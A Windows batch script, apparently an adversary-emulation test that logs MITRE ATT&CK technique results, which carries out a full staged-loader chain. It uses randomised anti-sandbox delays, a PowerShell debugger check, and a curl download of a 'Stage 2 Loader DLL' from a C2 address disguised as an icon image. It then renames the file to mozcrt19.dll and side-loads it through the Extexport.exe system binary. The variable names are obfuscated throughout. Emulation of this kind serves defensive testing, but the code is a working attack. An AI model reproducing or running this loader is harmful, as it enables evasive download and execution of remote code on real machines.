@echo off
setlocal enabledelayedexpansion

SET vqrtlm=%APPDATA%\10435\d34b428e
SET bwznkp=5776c3bd.txt
SET yjcxfa=https://10.0.0.49/stage/2/icon.png?10435-7
SET hnpqsd=BALAM-S2BO
SET rlbvtw=10435
SET mzkoje=7

SET logfile=%APPDATA%\!mzkoje!\macula-simulations.log
if not exist "%APPDATA%\!mzkoje!" mkdir "%APPDATA%\!mzkoje!"

SET tsvar=!DATE!/!TIME!

echo [!tsvar!][DEBUG][!hnpqsd!][!rlbvtw!]: script_start>> "!logfile!" 2>nul

REM --- Initial anti-sandbox delay (10-20s) before any logic ---
timeout /t 15 /nobreak >nul

REM --- Random delay component ---
SET /A delay=%RANDOM% %% 20 + 10
timeout /t %delay% /nobreak >nul

echo [!tsvar!][DEBUG][!hnpqsd!][!rlbvtw!]: initial_delay_complete>> "!logfile!" 2>nul

REM --- Heartbeat fetch (step 1): downloads Stage 2 Loader DLL from C2 ---
echo [!tsvar!][DEBUG][!hnpqsd!][!rlbvtw!]: heartbeat_start>> "!logfile!" 2>nul

curl -k -s -o "!vqrtlm!\!bwznkp!" "!yjcxfa!"
SET curl_err=%ERRORLEVEL%

echo [!tsvar!][DEBUG][!hnpqsd!][!rlbvtw!]: heartbeat_complete>> "!logfile!" 2>nul

if %curl_err% NEQ 0 (
    echo [%date% %time%][TTP][!hnpqsd!][!rlbvtw!]: T1071^|Application Layer Protocol=[FAIL]:[curl_failed]>> "!logfile!" 2>nul
    endlocal
    exit /b 1
)

echo [%date% %time%][TTP][!hnpqsd!][!rlbvtw!]: T1071^|Application Layer Protocol=[OK]:[]>> "!logfile!" 2>nul

REM --- Anti-analysis (step 2): Debugger.IsAttached check via PowerShell ---
REM     Query whether a debugger is present using PowerShell's
REM     [System.Diagnostics.Debugger]::IsAttached. If detected, sleep a
REM     random 2000-5000ms but always continue — never abort.
echo [!tsvar!][DEBUG][!hnpqsd!][!rlbvtw!]: anti_analysis_start>> "!logfile!" 2>nul

powershell -NoProfile -NonInteractive -Command ^
  "if ([System.Diagnostics.Debugger]::IsAttached) { Start-Sleep -Milliseconds (Get-Random -Minimum 2000 -Maximum 5001) }" >nul 2>&1

echo [!tsvar!][DEBUG][!hnpqsd!][!rlbvtw!]: anti_analysis_check_complete>> "!logfile!" 2>nul

echo [%date% %time%][TTP][!hnpqsd!][!rlbvtw!]: T1497^|Virtualization/Sandbox Evasion=[OK]:[]>> "!logfile!" 2>nul

REM --- Inter-operation delay ---
ping -n 8 127.0.0.1 >nul

REM --- Inter-operation delay ---
CHOICE /C Y /N /D Y /T 7 >nul

REM --- Change working directory to Loader location ---
echo [!tsvar!][DEBUG][!hnpqsd!][!rlbvtw!]: chdir_start>> "!logfile!" 2>nul

cd /d "!vqrtlm!" >nul 2>&1
SET cd_err=%ERRORLEVEL%

echo [!tsvar!][DEBUG][!hnpqsd!][!rlbvtw!]: chdir_result=%cd_err%>> "!logfile!" 2>nul

REM --- Rename downloaded Loader DLL to mozcrt19.dll for Extexport LOLBIN ---
echo [!tsvar!][DEBUG][!hnpqsd!][!rlbvtw!]: dll_rename_start>> "!logfile!" 2>nul

rename "!bwznkp!" mozcrt19.dll >nul 2>&1
SET ren_err=%ERRORLEVEL%

echo [!tsvar!][DEBUG][!hnpqsd!][!rlbvtw!]: dll_rename_result=%ren_err%>> "!logfile!" 2>nul

REM --- Inter-operation delay ---
timeout /t 5 /nobreak >nul

REM --- LOLBIN invocation: Extexport.exe loads mozcrt19.dll from output dir ---
echo [!tsvar!][DEBUG][!hnpqsd!][!rlbvtw!]: lolbin_start>> "!logfile!" 2>nul

%SystemRoot%\System32\Extexport.exe "!vqrtlm!" foo bar
SET lolbin_err=%ERRORLEVEL%

echo [!tsvar!][DEBUG][!hnpqsd!][!rlbvtw!]: lolbin_complete>> "!logfile!" 2>nul

if %lolbin_err% NEQ 0 (
    echo [%date% %time%][TTP][!hnpqsd!][!rlbvtw!]: T1218^|System Binary Proxy Execution=[FAIL]:[lolbin_invocation_failed]>> "!logfile!" 2>nul
    endlocal
    exit /b 1
)

echo [%date% %time%][TTP][!hnpqsd!][!rlbvtw!]: T1218^|System Binary Proxy Execution=[OK]:[]>> "!logfile!" 2>nul

echo [!tsvar!][DEBUG][!hnpqsd!][!rlbvtw!]: script_exit>> "!logfile!" 2>nul

endlocal
exit /b 0